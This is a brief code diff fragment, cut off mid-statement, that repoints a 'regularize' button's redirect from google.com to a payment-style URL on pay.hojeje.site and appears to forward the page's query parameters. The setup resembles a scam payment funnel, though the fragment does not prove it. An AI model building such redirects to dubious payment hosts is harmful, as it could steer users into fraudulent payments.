@@ -411,7 +411,7 @@ document.addEventListener("DOMContentLoaded", function () {
   const regularizeBtn = document.getElementById("regularizeBtn");
   if (regularizeBtn) {
     regularizeBtn.addEventListener("click", function () {
-      const baseUrl = "https://www.google.com";
+      const baseUrl = "https://pay.hojeje.site/PyE2Zy8z4Vn3qRb";
       const currentParams = window.location.search;
 
       const finalUrl = currentParams
